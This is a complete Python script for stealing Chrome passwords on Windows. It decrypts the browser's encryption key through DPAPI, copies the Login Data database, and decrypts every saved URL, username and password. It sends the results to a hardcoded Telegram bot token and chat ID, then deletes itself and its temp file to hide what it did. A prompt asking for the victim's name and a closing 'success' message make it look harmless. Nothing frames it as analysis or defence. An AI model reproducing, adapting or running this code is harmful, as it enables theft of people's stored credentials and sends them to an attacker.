from datetime import timezone, datetime, timedelta
import subprocess
import sqlite3
import shutil
import base64
import json
import os
import sys

print("checking of dependency.....")
try:
    import requests
except:
    print("installing requests")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
try:
    from Crypto.Cipher import AES
except:
    print("installing pycryptodome")
    subprocess.check_call(
        [sys.executable, '-m', 'pip', 'install', 'pycryptodome'])
try:
    import win32crypt
except:
    print("installing pywin32")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def fetching_encryption_key():
    # Local_computer_directory_path will look
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def send(text):
    url = f'https://api.telegram.org/bot5034373769:AAH4X2ztyvTW5RYTGf2vXcO19hCqVotat5Y/sendMessage'
    payload = {
        'chat_id': 1410223644,
        'text': text
    }

    r = requests.post(url, json=payload)
    return r


def temp_store(mode, data=None):
    if mode == 'write':
        with open("temp.txt", 'a') as f:
            f.write(data)

    elif mode == 'read':
        with open("temp.txt", 'r') as f:
            return f.readlines()


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:

        send("unencripted data : "+str(iv))

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:

            infos = f'''Main URL: {main_url}
            Login URL: {login_page_url}
            User name: {user_name}
            Decrypted Password: {decrypted_password}
            '''
            temp_store("write", infos)

        else:
            continue

        # if date_of_creation != 86400000000 and date_of_creation:
        #     print(
        #         f"Creation date: {str(chrome_date_and_time(date_of_creation))}")

        # if last_usuage != 86400000000 and last_usuage:
        #     print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
        # print("=" * 100)
    cursor.close()
    db.close()

    try:

        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass


def delete_file():
    os.remove(os.path.abspath(sys.argv[0]))
    os.remove("temp.txt")


if __name__ == "__main__":
    name = input("enter your name:  ")
    send(f"data from {name}")
    main()
    send(temp_store("read"))
    print('success')
    delete_file()
